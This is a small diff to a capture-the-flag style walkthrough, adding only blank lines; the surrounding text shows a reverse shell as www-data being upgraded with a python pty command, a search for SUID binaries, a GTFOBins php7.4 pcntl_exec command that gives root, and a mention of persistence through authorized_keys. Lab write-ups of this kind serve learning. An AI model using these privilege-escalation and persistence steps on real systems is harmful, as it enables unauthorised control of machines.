@@ -124,6 +124,7 @@ We get a reverse shell, as www-data.
 ```
 export TERM=xterm;python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
+
 ![image](https://github.com/user-attachments/assets/bb1e2a10-7faf-40fb-abd8-7ddfbf7a2f10)
 
 We cannot check for sudo rights on www-data because we don't have the password. But we can search for binaries that may have the SUID bit set.
@@ -143,6 +144,7 @@ Checking out the findings on GTFOBins php seems to be a great candidate for Priv
 ```shell
 /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
 ```
+
 ![image](https://github.com/user-attachments/assets/4bcce87e-17d0-4de1-9c29-1a4e3eed8e1a)
 
 Now that we have root access, we can submit the proof of pwnage. Additionally we can have persistence on the machine by adding our public key to the authorized_keys file.
